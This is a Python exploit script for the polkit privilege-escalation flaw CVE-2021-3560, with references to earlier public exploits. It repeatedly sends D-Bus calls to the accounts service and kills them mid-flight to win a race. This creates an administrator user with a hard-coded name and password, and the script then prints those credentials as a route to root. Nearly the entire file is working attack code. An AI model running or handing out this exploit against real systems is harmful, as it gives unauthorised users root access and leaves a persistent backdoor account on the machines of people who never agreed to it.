#!/usr/bin/python3

import sys, signal, time, subprocess, shlex, random, pdb, os, pwd

# colors
def inRed(s): print("\033[91m {}\033[00m" .format(s), end="")
def inGreen(s): print("\033[92m {}\033[00m" .format(s), end="")
def inYellow(s): print("\033[93m {}\033[00m" .format(s), end="")
def inMagenta(s): print("\033[95m {}\033[00m" .format(s), end="")

# ctrl + c
def signal_handler(signum, frame):
    inRed("\n[!] Exiting..."); sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# create user
def createUser(default_user):
    time.sleep(2)
    exit_user, counter = False, 0
    inYellow("\n[+] Trying to create default user...\n\n")
    while not exit_user:
        # start and kill the process until the user is created
        time.sleep(0.5)
        inYellow("\t[-] Attempt"); inRed(f"{counter}\n")
        counter += 1
        process = subprocess.Popen(shlex.split(f'dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:{default_user} string:"creating user" int32:1'), stderr=subprocess.DEVNULL)
        try:
            rand = random.uniform(0.006, 0.009)
            process.wait(timeout=rand)
            process.kill()
        except subprocess.TimeoutExpired:
                process.kill()
        
        # validate user creation
        user = subprocess.run(shlex.split(f'id {default_user}'), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode('utf-8')
        if user.find("uid") != -1:
            inYellow("\n\t[*] User created:"); inMagenta(f"{default_user}")
            inYellow("\n\t[*] Time out at:"); inGreen(str(rand) + "\n")
            exist_user = True
            break
        if counter - 1 > 100:
            inRed("\n[-] Error creating user!"); sys.exit()

# assing password
def assignPasswd(default_user, default_password):
    time.sleep(2)
    inYellow("\n[+] Assigning password to user"); inMagenta(f"{default_user}\n")
    for i in range(200):
        # start and kill the process until the password is created
        # extract UID from user
        uid = "/org/freedesktop/Accounts/User" + str(pwd.getpwnam(f"{default_user}").pw_uid)
        # Create password in SHA-512 format
        hash_passwd = subprocess.run(shlex.split(f'openssl passwd -5 {default_password}'), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).stdout.decode('utf-8')
        passwd = f"string:{hash_passwd.rstrip()}"
        # Assign password to user
        process = subprocess.Popen(shlex.split(f'dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply {uid} org.freedesktop.Accounts.User.SetPassword {passwd} string:"assign user passsword"'), stderr=subprocess.DEVNULL)
        try:
            rand = random.uniform(0.006, 0.009)
            process.wait(timeout=rand)
            process.kill()
        except subprocess.TimeoutExpired:
            process.kill()
    time.sleep(0.5)
    inYellow("\n\t[*] Registered password")
    inYellow("\n\t[*] Time out at:"); inGreen(str(rand) + "\n")

# get credentials sudo
def getCredentials(default_user, default_passwd):
    time.sleep(2)
    inYellow("\n[+] Exploit Completed, log in to be root:\n\n")
    time.sleep(0.5)
    inYellow("\t[*] User :"); inGreen(f"{default_user}\n")
    inYellow("\t[*] Password:"); inGreen(f"{default_passwd}\n\n")

# process
def run():
    default_user = 'marss'
    default_password = 'marss###'
    createUser(default_user)
    assignPasswd(default_user, default_password)
    getCredentials(default_user, default_password)

# main
if __name__ == '__main__':
    run()
    time.sleep(2)

# References
#------------------------------------------------------------------------------------
# https://github.com/innxrmxst/CVE-2021-3560/blob/main/ex.py
# https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html
